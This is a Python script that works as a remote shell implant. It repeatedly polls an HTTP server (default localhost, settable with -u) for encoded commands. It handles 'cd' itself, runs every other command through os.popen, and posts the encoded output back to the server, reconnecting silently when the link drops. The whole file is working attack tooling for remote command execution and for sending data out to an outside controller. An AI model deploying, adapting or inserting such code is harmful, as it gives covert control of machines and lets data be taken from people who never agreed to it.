import requests
import os
from time import sleep
from base64 import urlsafe_b64encode
import zlib
import sys
from custom_encode import *

###############################################################################
#
# Args
#
##

BASE_URL = "http://127.0.0.1:8000"
VERBOSE=0

for index in range(len(sys.argv)):
  av = sys.argv[index]
  if av == '-v':
    VERBOSE=1
  if av == '-u':
    BASE_URL = sys.argv[index+1]

###############################################################################
#
# Funcs
#
##

def vprint(txt):
  if VERBOSE:
    print(txt)

###############################################################################
#
# Main
#
##

vprint("Connecting to : '{}'".format(BASE_URL))

h = {'User-Agent': '-', 'Content-Type': '-'}

while True:

  try:
    s = requests.session()

    r = s.get(BASE_URL)
    c = r.text.strip()
    c = custom_decode(c)

    vprint(c)
    if 'cd ' in c[:4]:
      new_path = c.split('cd ')[1]
      os.chdir(new_path)
      continue

    o = os.popen(c, 'r').read().strip().encode()
    r = s.post(BASE_URL, custom_encode(o), headers=h)

  except KeyboardInterrupt:
    vprint("\nCTRL+C : interrupted.")
    exit()

  except requests.exceptions.ConnectionError:
    sleep(1)
    continue

  except:
    vprint("\nProcess aborted.")
    exit()

